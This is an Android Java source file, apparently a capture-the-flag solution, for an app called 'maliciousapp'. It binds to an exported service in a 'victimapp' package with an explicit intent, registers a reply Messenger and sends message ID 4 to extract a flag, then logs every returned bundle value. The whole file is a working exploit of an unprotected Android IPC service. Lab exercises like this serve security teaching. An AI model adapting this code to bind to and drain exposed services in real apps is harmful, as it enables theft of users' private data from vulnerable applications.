package com.example.maliciousapp;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.os.Messenger;
import android.os.RemoteException;
import android.util.Log;

import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "CTF";

    // 1. copy paste example -> IncomingHandler class
    // Create the listener for incoming messages from the service.
    static class IncomingHandler extends Handler {

        @Override
        public void handleMessage(Message msg) {

            // Challenge Spec: MSG_GET_FLAG returns ID 4
            if (msg.what == 4) {
                // bundle everything like in justlisten
                Bundle bundle = (Bundle) msg.obj;

                if (bundle != null) {
                    for (String key : bundle.keySet()) {
                        Object value = bundle.get(key);
                        Log.d(TAG, "Found Key: " + key + " | Value: " + value);
                    }
                }
            }

        }
    }

    // 2. Create the Messenger receiving the flag
    final Messenger mClientMessenger = new Messenger(new IncomingHandler());


    // 3. from ActivityMessenger
    Messenger mService = null;
    boolean bound;

        private ServiceConnection mConnection = new ServiceConnection() {
            public void onServiceConnected(ComponentName className, IBinder service) {
                mService = new Messenger(service);
                bound = true;

                // 4. add this to adapt it - IMPORTANT
                try {
                    // Step A: Register (ID 1)
                    Message msgRegister = Message.obtain(null, 1);

                    // IMPORTANT: Tell the service where to reply!
                    msgRegister.replyTo = mClientMessenger;
                    mService.send(msgRegister);

                    // Step B: Get Flag (ID 4)
                    Message msgFlag = Message.obtain(null, 4);
                    mService.send(msgFlag);

                } catch (RemoteException e) {
                    e.printStackTrace();
                }
        }

        public void onServiceDisconnected(ComponentName className) {
            mService = null;
            bound = false;
        }
    };

        @Override
        protected void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);

            // 4. explicit intent
            // intent new intent, setclassname (package, class)
            Intent intent = new Intent();
            intent.setClassName("com.example.victimapp", "com.example.victimapp.UnbindableService");

            // 5. bind to the service
            bindService(intent, mConnection, Context.BIND_AUTO_CREATE);

        }


        // 6. good practice to destroy the connection
        @Override
        protected void onDestroy() {
            super.onDestroy();
            if (bound) {
                unbindService(mConnection);
                bound = false;
            }
        }


    }
